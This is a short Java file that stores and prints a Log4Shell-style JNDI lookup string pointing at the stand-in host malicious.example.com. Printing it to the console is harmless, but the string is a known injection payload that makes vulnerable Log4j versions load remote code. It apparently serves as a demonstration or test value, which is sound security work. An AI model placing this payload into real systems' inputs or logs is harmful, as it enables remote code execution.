public class Main {
    public static void main(String[] args) {
        String payload = "${jndi:ldap://malicious.example.com/a}";
        System.out.println(payload);
    }
}
